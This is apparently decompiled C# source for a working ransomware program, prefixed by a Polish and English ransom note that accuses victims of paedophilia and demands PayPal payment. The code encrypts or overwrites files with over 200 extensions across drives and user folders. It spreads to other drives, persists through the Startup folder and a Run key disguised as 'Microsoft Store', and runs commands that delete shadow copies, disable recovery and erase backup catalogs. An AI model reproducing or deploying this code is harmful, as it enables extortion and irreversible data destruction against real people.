		"TWOJE PLIKI ZOSTANA USUNIETE W 12 GODZIN JESLI NIE OPLACISZ OPLATYTWOJE PLIKI ZOSTANA USUNIETE W 12 GODZIN JESLI NIE OPLACISZ OPLATY", "TWOJE PLIKI ZOSTANA USUNIETE W 12 GODZIN JESLI NIE OPLACISZ OPLATY", "--------------------------------------------------------------------------------------------------------", "HELLO! ALL YOUR FILES HAVE BEEN ENCRYPTED BY FIGHT AGAINST PEDOPHILIA!", "IF YOU SEE THIS, YOU ARE PROBABLY A FUCKING PEDOPHIL", "CONSEQUENCES", "-------------------------------------------------- -------------------------------------------------- --------------", "what if i didn't go in? check your family members, friends or other people who use your computer", "how to decrypt computer and restore files?", "pay PLN 300 on paypal: xanxxior22233@gmail.com",
		"", "thanks to that you made contact on discord by decrypt files: endhorjim#48 ", "YOUR FILES WILL BE DELETED IN 12 HOURS IF YOU DO NOT PAY", "YOUR FILES WILL BE DELETED IN 12 HOURS IF YOU DO NOT PAY", "YOUR FILES WILL BE DELETED IN 12 HOURS IF YOU DO NOT PAY", "YOUR FILES WILL BE DELETED IN 12 HOURS IF YOU DO NOT PAY", "YOUR FILES WILL BE DELETED IN 12 HOURS IF YOU DO NOT PAY"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>58Y7U+8Cn/zTqfzCm9JmvAph1zgqtTA7gBIG8uDWb4HiDOcoinH6iFD9TEZNR3jhDAIdlolmu7CnlhbywezIP4QVpECRcUQjoRgHHj70gm0vMsFF7D06UIt1j9b+pshKxVK9PiohDweC/VWF5Dgd79q1jWnnVgc4XeIYA7I41Qk=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
